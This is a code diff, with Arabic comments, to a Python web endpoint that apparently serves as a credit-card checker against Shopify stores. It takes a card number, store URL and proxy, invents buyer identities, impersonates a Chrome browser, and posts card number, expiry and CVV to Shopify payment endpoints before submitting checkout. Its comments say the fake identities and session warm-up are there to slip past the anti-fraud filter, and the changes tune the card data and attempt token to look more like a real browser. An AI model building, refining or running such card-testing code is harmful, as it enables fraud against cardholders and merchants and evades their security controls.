@@ -42,24 +42,24 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         proxy_url = format_proxy(proxy)
         proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
 
-        # 🔥 توليد هويات بشرية حقيقية وعناوين غير محروقة للهروب من الفلتر الأمني
         first_names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "William"]
         last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson"]
         fn = random.choice(first_names)
         ln = random.choice(last_names)
+        full_name = f"{fn} {ln}"
         email = f"{fn.lower()}{ln.lower()}{random.randint(100, 999)}@gmail.com"
         streets = ["W 85th St", "E 22nd St", "Broadway", "Park Ave", "Lexington Ave", "Columbus Ave", "Madison Ave"]
         address1 = f"{random.randint(100, 9999)} {random.choice(streets)}"
 
         buyer = {
-            "email": email, "first_name": fn, "last_name": ln,
+            "email": email, "first_name": fn, "last_name": ln, "full_name": full_name,
             "address1": address1, "city": "New York", "province": "NY", "zip": "10024", "country": "US", "phone": f"212{random.randint(2000000, 9999999)}"
         }
 
         with requests.Session(impersonate="chrome120") as session:
             session.verify = False
 
-            # 🔥 تسخين الجلسة (Session Warm-up) للحصول على كوكيز التتبع الشرعية
+            # تسخين الجلسة
             try:
                 session.get(store_url, timeout=10, proxies=proxies)
                 time.sleep(1)
@@ -131,8 +131,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "Content-Type": "application/json", 
                 "Accept": "application/json"
             }
-            res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
-            if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
+            # 🔥 الإصلاح الأمني الفادح: إرسال الاسم بالكامل وليس الاسم الأول فقط
+            res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['full_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
+            if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['full_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
             if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price, "Unknown"))
             card_session_id = res_pci.json().get("id")
 
@@ -291,8 +292,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
             sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}...on SubmitAlreadyAccepted{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}...on SubmitRejected{__typename errors{code localizedMessage}}...on SubmittedForCompletion{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}}}"""
             
+            # 🔥 الإصلاح الثاني: التوكن الآن مطابق لتوليد المتصفح الفعلي
             sub_vars = {
-                "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:16]}",
+                "attemptToken": f"{checkout_token}-{str(uuid.uuid4())}",
                 "input": {
                     "sessionInput": {"sessionToken": session_token},
                     "queueToken": queue_token,
